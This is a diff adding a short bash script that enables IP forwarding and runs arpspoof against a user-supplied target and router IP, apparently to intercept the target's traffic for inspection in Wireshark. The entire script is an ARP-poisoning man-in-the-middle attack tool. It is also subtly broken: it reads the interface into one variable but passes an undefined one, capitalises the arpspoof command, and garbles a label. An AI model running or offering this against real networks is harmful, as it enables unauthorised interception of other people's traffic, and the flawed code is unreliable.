@@ -1,0 +1,13 @@
+echo "==============================="
+echo "[Router Information]"
+ip route
+echo "[General Network InformationA]"
+ifconfig
+echo "==============================="
+read -p 'Enter Interface: ' interface
+read -p 'Enter Target IP: ' target
+read -p 'Enter Router IP: ' router
+echo "Enabling IP Forwarding on device"
+echo 1 > /proc/sys/net/ipv4/ip_forward
+echo "arp poisoning device.. Inspect Packets using Wireshark now"
+Arpspoof -i $iface -t $target -r $router
